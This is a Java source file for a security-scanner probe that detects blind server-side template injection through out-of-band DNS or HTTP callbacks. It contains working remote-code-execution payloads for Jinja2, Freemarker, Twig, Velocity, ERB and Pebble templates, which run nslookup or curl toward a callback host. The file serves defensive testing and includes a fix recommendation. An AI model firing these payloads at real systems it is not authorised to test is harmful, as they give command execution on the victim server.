package com.burpmax.active;

import java.util.*;
import static com.burpmax.model.Finding.*;

/**
 * OOB blind SSTI → RCE confirmation probe.
 *
 * The existing SstiProbe detects template injection by checking if math
 * expressions ({{7*7}} → 49) are evaluated and reflected in the response.
 * This misses a large class of SSTI in practice:
 *
 *   - Email/notification templates: rendered server-side but never sent to browser
 *   - PDF/report generators: template rendered to file, response is a download link
 *   - Async job processors: template evaluated in background worker
 *   - Error pages that log but don't reflect template output
 *
 * Strategy: inject template expressions that, if evaluated, execute a system
 * command to make an outbound DNS or HTTP request to the OOB host.
 * If the OOB server receives a callback, the template was both evaluated AND
 * had RCE-level access to OS execution primitives — the most severe outcome.
 *
 * Engine-specific RCE payloads:
 *
 *   Jinja2 (Python):
 *     {{''.__class__.__mro__[1].__subclasses__()[N].__init__.__globals__
 *       ['os'].popen('curl http://HOST/ssti').read()}}
 *     Simplified using the config/request globals shortcut:
 *     {{config.__class__.__init__.__globals__['os'].popen('nslookup HOST').read()}}
 *
 *   Freemarker (Java):
 *     <#assign ex="freemarker.template.utility.Execute"?new()>${ex("nslookup HOST")}
 *
 *   Twig (PHP):
 *     {{['nslookup HOST']|filter('system')}}
 *     {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("nslookup HOST")}}
 *
 *   Velocity (Java):
 *     #set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))
 *     #set($chr=$x.class.forName('java.lang.Character'))
 *     #set($str=$x.class.forName('java.lang.String'))
 *     #set($ex=$rt.getRuntime().exec('nslookup HOST'))
 *
 *   ERB (Ruby):
 *     <%= `nslookup HOST` %>
 *
 *   Pebble/Jinjava:
 *     {{'a'.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass())
 *       .invoke('a'.getClass().forName('java.lang.Runtime').getMethod('getRuntime')
 *       .invoke(null),'nslookup HOST')}}
 *
 * Note: these are intentionally written to use nslookup/ping as the command
 * (universally available, no output needed) rather than more destructive commands.
 * The OOB DNS callback is sufficient to confirm RCE capability.
 */
public class BlindSstiProbe {

    // Template: HOST replaced at runtime with the OOB hostname
    private static final List<String[]> OOB_PAYLOADS = List.of(
        // [payload, engine]
        new String[]{
            "{{config.__class__.__init__.__globals__['os'].popen('nslookup HOST').read()}}",
            "Jinja2"
        },
        new String[]{
            "{{''.__class__.__mro__[1].__subclasses__()}}",   // safe enumeration first
            "Jinja2-enum"
        },
        new String[]{
            "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"nslookup HOST\")}",
            "Freemarker"
        },
        new String[]{
            "{{['nslookup HOST']|filter('system')}}",
            "Twig"
        },
        new String[]{
            "<%= `nslookup HOST` %>",
            "ERB"
        },
        new String[]{
            "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))" +
            "#set($ex=$rt.getRuntime().exec('nslookup HOST'))$ex",
            "Velocity"
        }
    );

    // ── Main entry point ──────────────────────────────────────────────────────
    public static List<ActiveScanResult> probe(ProbeContext ctx,
                                               RequestBuilder rb,
                                               HttpSender sender,
                                               OobClient oob) {
        if (oob == null || !oob.isAvailable()) return List.of();

        List<ActiveScanResult> results = new ArrayList<>();

        for (String param : ctx.allParamNames()) {
            // One OOB host per param; all engine payloads share it
            // (any callback confirms the param is injectable, engine identified by payload)
            String oobHost = oob.generateHost("ssti-" + param);
            if (oobHost == null) continue;

            for (String[] entry : OOB_PAYLOADS) {
                // Skip safe enumeration payload (it won't trigger OOB)
                if ("Jinja2-enum".equals(entry[1])) continue;

                String payload = entry[0].replace("HOST", oobHost);
                byte[] req = rb.buildProbeRequest(ctx, param, payload);
                if (req == null) continue;

                // Record before sending so a callback matches even if send() returns null.
                oob.recordInjection(oobHost, "SSTI → RCE (Blind OOB) [" + entry[1] + "]",
                        ctx.url, param, payload);
                sender.send(ctx.service, req);  // fire-and-forget
            }
        }

        return results;
    }

    // ── Finding builder ───────────────────────────────────────────────────────
    public static ActiveScanResult buildFinding(OobClient.OobHit hit) {
        // Extract engine from probeName: "SSTI → RCE (Blind OOB) [Jinja2]"
        String engine = "unknown";
        int lb = hit.probeName().lastIndexOf('[');
        int rb2 = hit.probeName().lastIndexOf(']');
        if (lb >= 0 && rb2 > lb) engine = hit.probeName().substring(lb + 1, rb2);

        return new ActiveScanResult(
            "Server-Side Template Injection → RCE (Blind OOB)", SEV_CRITICAL,
            "Blind SSTI with RCE was confirmed via an out-of-band " + hit.interactionType() +
            " callback on a " + engine + " template engine. The payload injected into '" +
            hit.parameter() + "' caused the server to execute a system command that made " +
            "an outbound connection to the OOB host (" + hit.interactionDetail() + "). " +
            "This confirms that: (1) the parameter is passed to a template engine, " +
            "(2) the template engine evaluates expressions, and (3) OS command execution " +
            "is reachable from within the template context - full Remote Code Execution. " +
            "Even if the output is not reflected in the HTTP response, an attacker can " +
            "exfiltrate data and establish reverse shells via OOB channels.",
            "OOB callback: " + hit.interactionDetail() +
            " | Engine: " + engine +
            " | Parameter: " + hit.parameter() +
            " | Payload: " + trunc(hit.payload(), 100),
            "PRIMARY FIX: never pass user input as the template string.\n" +
            "Use it as a variable inside a fixed template only.\n" +
            "Sandbox the engine (Jinja2 SandboxedEnvironment, Freemarker ClassResolver restrictions).\n" +
            "Rotate all credentials immediately - blind SSTI confirms OS code execution and\n" +
            "full access to environment variables, secrets, and cloud metadata.",
            "CWE-94",
            hit.endpoint(), hit.parameter(), hit.payload(), "", hit.interactionDetail());
    }

    private static String trunc(String s, int n) {
        return s == null ? "" : s.length() > n ? s.substring(0, n) + "..." : s;
    }
}
